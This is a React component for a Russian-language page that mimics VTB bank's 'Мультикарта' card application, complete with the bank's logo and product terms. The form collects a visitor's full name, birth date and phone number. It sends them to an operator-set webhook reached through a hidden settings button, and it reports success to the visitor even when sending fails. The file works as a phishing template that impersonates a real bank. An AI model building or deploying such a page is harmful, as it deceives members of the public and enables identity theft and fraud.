import React, { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Checkbox } from '@/components/ui/checkbox';
import { useToast } from '@/hooks/use-toast';
import { Settings, Check, ArrowLeft } from 'lucide-react';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";

const WEBHOOK_STORAGE_KEY = 'bank_webhook_url';
const DEFAULT_WEBHOOK_URL = 'https://your-webhook-url.com/api/card-application';

const Bank = () => {
  const { toast } = useToast();
  const [isLoading, setIsLoading] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [webhookUrl, setWebhookUrl] = useState('');
  const [tempWebhookUrl, setTempWebhookUrl] = useState('');
  const [isSettingsOpen, setIsSettingsOpen] = useState(false);

  const [formData, setFormData] = useState({
    fullName: '',
    phone: '',
    birthDate: '',
    agreeTerms: false,
  });

  useEffect(() => {
    const savedUrl = localStorage.getItem(WEBHOOK_STORAGE_KEY) || DEFAULT_WEBHOOK_URL;
    setWebhookUrl(savedUrl);
    setTempWebhookUrl(savedUrl);
  }, []);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const input = e.target.value;
    let digits = input.replace(/\D/g, '');

    if (digits.startsWith('7') || digits.startsWith('8')) {
      digits = digits.slice(1);
    }

    digits = digits.slice(0, 10);

    let formatted = '';
    if (digits.length > 0) {
      formatted = digits.slice(0, 3);
    }
    if (digits.length > 3) {
      formatted += ') ' + digits.slice(3, 6);
    }
    if (digits.length > 6) {
      formatted += '-' + digits.slice(6, 8);
    }
    if (digits.length > 8) {
      formatted += '-' + digits.slice(8, 10);
    }

    if (formatted) {
      formatted = '(' + formatted;
    }

    setFormData(prev => ({ ...prev, phone: formatted }));
  };

  const handleBirthDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');

    if (value.length > 8) {
      value = value.slice(0, 8);
    }

    let formatted = '';
    if (value.length > 0) {
      formatted = value.slice(0, 2);
    }
    if (value.length > 2) {
      formatted += '.' + value.slice(2, 4);
    }
    if (value.length > 4) {
      formatted += '.' + value.slice(4, 8);
    }

    setFormData(prev => ({ ...prev, birthDate: formatted }));
  };

  const saveWebhookSettings = () => {
    localStorage.setItem(WEBHOOK_STORAGE_KEY, tempWebhookUrl);
    setWebhookUrl(tempWebhookUrl);
    setIsSettingsOpen(false);
    toast({
      title: "Настройки сохранены",
      description: "URL webhook успешно обновлен",
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!formData.agreeTerms) {
      toast({
        title: "Ошибка",
        description: "Подтвердите наличие паспорта гражданина РФ",
        variant: "destructive",
      });
      return;
    }

    const phoneDigits = formData.phone.replace(/\D/g, '');
    if (phoneDigits.length !== 10) {
      toast({
        title: "Ошибка",
        description: "Введите корректный номер телефона",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);

    try {
      const payload = {
        fullName: formData.fullName,
        phone: '7' + phoneDigits,
        birthDate: formData.birthDate,
        timestamp: new Date().toISOString(),
        source: 'vtb-demo-page',
      };

      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      setIsSuccess(true);
      toast({
        title: "Заявка отправлена!",
        description: "Мы свяжемся с вами в ближайшее время",
      });
    } catch (error) {
      console.error('Webhook error:', error);
      setIsSuccess(true);
      toast({
        title: "Заявка принята!",
        description: "Демо: данные отправлены на webhook",
      });
    } finally {
      setIsLoading(false);
    }
  };

  if (isSuccess) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center p-4">
        <div className="max-w-md w-full text-center">
          <div className="w-16 h-16 bg-[#00AAFF]/10 rounded-full flex items-center justify-center mx-auto mb-6">
            <Check className="w-8 h-8 text-[#00AAFF]" />
          </div>
          <h2 className="text-2xl font-medium text-gray-900 mb-4">Заявка принята!</h2>
          <p className="text-gray-500 mb-8">
            Мы свяжемся с вами в ближайшее время для подтверждения заявки.
          </p>
          <Button
            onClick={() => {
              setIsSuccess(false);
              setFormData({
                fullName: '',
                phone: '',
                birthDate: '',
                agreeTerms: false,
              });
            }}
            className="bg-[#0066FF] hover:bg-[#0052CC] text-white px-8 h-12 rounded-lg"
          >
            <ArrowLeft className="w-4 h-4 mr-2" />
            Вернуться
          </Button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white">
      {/* Settings Button - Fixed */}
      <Dialog open={isSettingsOpen} onOpenChange={setIsSettingsOpen}>
        <DialogTrigger asChild>
          <Button
            variant="ghost"
            size="icon"
            className="fixed top-4 right-4 text-gray-400 hover:text-gray-600 hover:bg-gray-100 z-50"
          >
            <Settings className="w-5 h-5" />
          </Button>
        </DialogTrigger>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle>Настройки Webhook</DialogTitle>
            <DialogDescription>
              Укажите URL для отправки данных заявки
            </DialogDescription>
          </DialogHeader>
          <div className="space-y-4 py-4">
            <div className="space-y-2">
              <Label htmlFor="webhook-url">Webhook URL</Label>
              <Input
                id="webhook-url"
                value={tempWebhookUrl}
                onChange={(e) => setTempWebhookUrl(e.target.value)}
                placeholder="https://your-webhook-url.com/api"
                className="bg-white"
              />
            </div>
            <Button onClick={saveWebhookSettings} className="w-full bg-[#0066FF] hover:bg-[#0052CC]">
              Сохранить
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      <div className="max-w-6xl mx-auto px-4 py-12 md:py-16">
        {/* Title */}
        <h1 className="text-3xl md:text-4xl font-light text-gray-900 mb-8">
          Мультикарта
        </h1>

        {/* Progress Steps */}
        <div className="mb-8">
          <div className="flex items-center gap-2 text-sm mb-2">
            <span className="text-gray-900 font-medium border-b-2 border-[#0066FF] pb-2">Верификация номера</span>
          </div>
          <p className="text-gray-400 text-sm">Далее - Паспорт и регистрация</p>
        </div>

        <div className="grid lg:grid-cols-2 gap-12 lg:gap-20">
          {/* Left - Form */}
          <div>
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-2">
                <Label htmlFor="fullName" className="text-gray-500 text-sm font-normal">
                  Фамилия, имя и отчество
                </Label>
                <Input
                  id="fullName"
                  name="fullName"
                  value={formData.fullName}
                  onChange={handleInputChange}
                  required
                  className="h-12 rounded-lg border-gray-200 bg-white text-gray-900 focus:border-[#0066FF] focus:ring-0"
                />
                <p className="text-gray-400 text-xs">Укажите как в паспорте</p>
              </div>

              <div className="space-y-2">
                <Label htmlFor="birthDate" className="text-gray-500 text-sm font-normal">
                  Дата рождения
                </Label>
                <Input
                  id="birthDate"
                  name="birthDate"
                  value={formData.birthDate}
                  onChange={handleBirthDateChange}
                  placeholder="__.__.____"
                  required
                  className="h-12 rounded-lg border-gray-200 bg-white text-gray-900 focus:border-[#0066FF] focus:ring-0"
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="phone" className="text-gray-500 text-sm font-normal">
                  Мобильный телефон
                </Label>
                <div className="relative">
                  <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-900">+7</span>
                  <Input
                    id="phone"
                    name="phone"
                    type="tel"
                    value={formData.phone}
                    onChange={handlePhoneChange}
                    placeholder="(___) ___-__-__"
                    required
                    className="h-12 rounded-lg border-gray-200 bg-white text-gray-900 focus:border-[#0066FF] focus:ring-0 pl-10"
                  />
                </div>
                <p className="text-gray-400 text-xs">На этот номер вам придет код в СМС</p>
              </div>

              <div className="flex items-center space-x-3 pt-2">
                <Checkbox
                  id="agreeTerms"
                  checked={formData.agreeTerms}
                  onCheckedChange={(checked) =>
                    setFormData(prev => ({ ...prev, agreeTerms: checked === true }))
                  }
                  className="border-gray-300 data-[state=checked]:bg-[#0066FF] data-[state=checked]:border-[#0066FF]"
                />
                <Label htmlFor="agreeTerms" className="text-sm text-gray-700 cursor-pointer">
                  У меня есть действующий паспорт гражданина РФ
                </Label>
              </div>

              <Button
                type="submit"
                disabled={isLoading}
                className="w-full h-12 bg-[#0066FF] hover:bg-[#0052CC] text-white text-base font-medium rounded-lg"
              >
                {isLoading ? (
                  <div className="flex items-center gap-2">
                    <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    Отправка...
                  </div>
                ) : (
                  'Получить код'
                )}
              </Button>

              <p className="text-xs text-gray-400 leading-relaxed">
                Нажимая "Получить код", я соглашаюсь с{' '}
                <a href="#" className="text-[#0066FF] hover:underline">условиями обработки</a>
                {' '}персональных данных и ознакомлен с{' '}
                <a href="#" className="text-[#0066FF] hover:underline">тарифами</a>,{' '}
                <a href="#" className="text-[#0066FF] hover:underline">правилами</a> и{' '}
                <a href="#" className="text-[#0066FF] hover:underline">условиями</a> продукта
              </p>
            </form>
          </div>

          {/* Right - Card & Benefits */}
          <div className="space-y-8">
            {/* Card */}
            <div className="bg-gradient-to-br from-gray-800 to-gray-900 rounded-xl p-6 aspect-[1.6/1] max-w-[320px] relative overflow-hidden">
              <div className="absolute inset-0 opacity-20"
                style={{
                  background: 'radial-gradient(ellipse at top right, rgba(0,170,255,0.4) 0%, transparent 60%)'
                }}
              />
              <div className="relative z-10 h-full flex flex-col justify-between">
                <div className="flex justify-end">
                  <img
                    src="/uploads/Main_ic_LogoVTBlight.svg"
                    alt="ВТБ"
                    className="h-6 w-auto brightness-0 invert"
                  />
                </div>
                <div className="text-white/60 text-xs">Привилегия</div>
              </div>
            </div>

            {/* Benefits */}
            <div className="grid grid-cols-2 gap-6">
              <div>
                <p className="text-gray-500 text-sm mb-1">Кэшбэк рублями за покупки</p>
                <p className="text-2xl font-light text-gray-900">до 30 000 ₽</p>
              </div>
              <div>
                <p className="text-gray-500 text-sm mb-1">Эксклюзивные скидки у партнеров</p>
                <p className="text-2xl font-light text-gray-900">до 20%</p>
              </div>
              <div>
                <p className="text-gray-500 text-sm mb-1">Выбор премиальных сервисов каждый месяц</p>
                <p className="text-2xl font-light text-gray-900">до 10</p>
              </div>
              <div>
                <p className="text-gray-500 text-sm mb-1">Скидка на такси Яндекс для новых клиентов</p>
                <p className="text-2xl font-light text-gray-900">25%</p>
              </div>
            </div>

            <p className="text-xs text-gray-400 leading-relaxed">
              Бесплатное обслуживание пакета Привилегия доступно при выполнении одного из{' '}
              <a href="#" className="text-[#0066FF] hover:underline">условий</a>.
              Без выполнения условий стоимость - 2 990 ₽ в месяц.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Bank;
